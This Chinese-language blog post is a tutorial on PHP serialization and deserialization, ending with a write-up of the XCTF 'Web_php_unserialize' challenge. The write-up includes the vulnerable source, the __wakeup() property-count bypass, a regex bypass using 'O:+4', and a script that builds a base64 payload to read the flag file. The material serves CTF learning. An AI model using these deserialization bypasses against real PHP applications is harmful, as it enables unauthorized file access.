---
title: php反序列化
date: 2020-04-24 09:49:57
updated: 2020-04-24 09:49:57
categories: web
---



在攻防世界做到一题有关PHP反序列化的题<a href="<https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank">Web_php_unserialize</a>，有点懵逼，所以去简单学习了一下<!--more-->



# serialize()

serialize()  ---> 函数用于序列化对象或数组，并返回一个字符串

```php
<?php
Class test{
  public $a= '1';
  public $bb= 2;
  public $ccc= True;
}

$r= new test();
echoserialize($r);

$array_t= array("a"=>"1","bb"=>"2","ccc"=>"3");
echo serialize($array_t);
```



> O:4:"test":3:{s:1:"a";s:1:"1";s:2:"bb";i:2;s:3:"ccc";b:1;}
> a:3:{s:1:"a";s:1:"1";s:2:"bb";s:1:"2";s:3:"ccc";s:1:"3";}

各个字符的意义 ---> `第一个字母O 代表 Object，a代表 array，s代表 string，,i表示数字`

![](https://img.npfs06.top/20210306095124.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
**类的属性有三种 private protected 和 public**

PHP 序列化的时候 **private**和 **protected** 变量会引入不可见字符`%00`，`%00类名%00属性名` 为private，`%00*%00属性名` 为protected，注意这两个 **%00**就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚

```
<?php
Class test{
  private $a= "a";
  protected $b= "b";
  public $c= "c";
}

$r= new test();
echo serialize($r);
echo urlencode(serialize($r));
```

>O:4:"test":3:{s:7:"testa";s:1:"a";s:4:"*b";s:1:"b";s:1:"c";s:1:"c";}
>
>O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D




# unserialize() 

unserialize() ---> 函数用于将通过 serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构

```
<?php
$sites = array('t1', 'tt2', 'ttt3');
$serialized_data = serialize($sites);
#echo  $serialized_data;
$unserialized_data = unserialize($serialized_data);
print_r($unserialized_data);
?>
```

>Array
>(
>​    [0] =>  t1
>​    [1] =>  tt2
>​    [2] =>  ttt3
>)



# 常用魔法函数


| 常用魔法函数  |                             定义                             |
| ------------- | :----------------------------------------------------------: |
| __construct() | 在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法 |
| __destruct()  | 和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法 |
| __toString()  |              当对象被当做一个字符串使用时调用。              |
| __sleep()     | 当调用`serialize()`函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作 |
| __wakeup()    | 反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数 |
| __invoke()    |             把一个实例对象当作函数使用时自动调用             |
| __call()      |          当调用对象中不存在的方法会自动调用该方法。          |
| __get()       |                在调用私有属性的时候会自动执行                |
| __isset()     |          在不可访问的属性上调用isset()或empty()触发          |
| __unset()     |             在不可访问的属性上使用unset()时触发              |



**__wakeup() bypass**

在需要对__wakeup() 进行绕过的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP < 5.6.25 和 PHP< 7.0.10

```php
<?php
Class User{
  public $name="Bob";
  
  function __destruct(){
    echo"nameis Bob </br>";
  }
  
  function __wakeup(){
    echo"exit</br>";
  }
}
@var_dump(unserialize($_POST["u"]));
```

POST 参数O:4:"User":1:{s:4:"name";s:3:"Bob";}可以看到输出是：

```
exit

object(User)[1]
 public 'name' => string 'Bob' (length=3)

nameis Bob
```

如果在某些情况下，不想让__wakeup() 执行，可以将 "User"后的 2 改为一个比2 大的数字

POST 参数O:4:"User":2:{s:4:"name";s:3:"Bob";}：
```
nameis Bob

booleanfalse
```



---
**[XCTF]Web – Web_php_unserialize**

题目源码：

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) {   #构造函数，对类的变量进行初始化
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() {  #魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) {         #存在$var                   
    $var = base64_decode($_GET['var']);   #将$var base64解码并赋值$var
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

思路：主要是正则绕过和_wakeup（）绕过

正则匹配：因为不能匹配`O:4`这种，我们可以`O:+4`绕过，因为在url编码中`+`会被转换为空格

__wakeup()绕过：让序列化结果中类属性的数值大于其真正的数值进行绕过

```php
<?php
class Demo {
    private $file = 'fl4g.php';
}

$a= new demo;
$b=serialize($a);  //echo  O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
$b=str_replace('O:4', 'O:+4',$b);//绕过preg_match
$b= str_replace(':1:', ':2:',$b);//绕过wakeup
echo base64_encode($b);     
?>
```

得到

> TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

再进行get传参即可



# reference

<a href="https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485916&idx=1&sn=ce338562a75b529b26d484fa90de031c&chksm=fe12fb41c96572572618a816ca615d562d5a4965990122c40e82a1b8f9084bc0a9438286a37c&mpshare=1&scene=23&srcid=0421ZkJIlDYGAZuUreh9EyXs&sharer_sharetime=1587447607661&sharer_shareid=20eedd9f9e15b3b3c30626e28ea74306#rd" target="___blank">php反序列化那些事 </a>

<a href="https://www.jianshu.com/p/8f498198fc3d" target="_blank">php序列化与反序列化入门</a>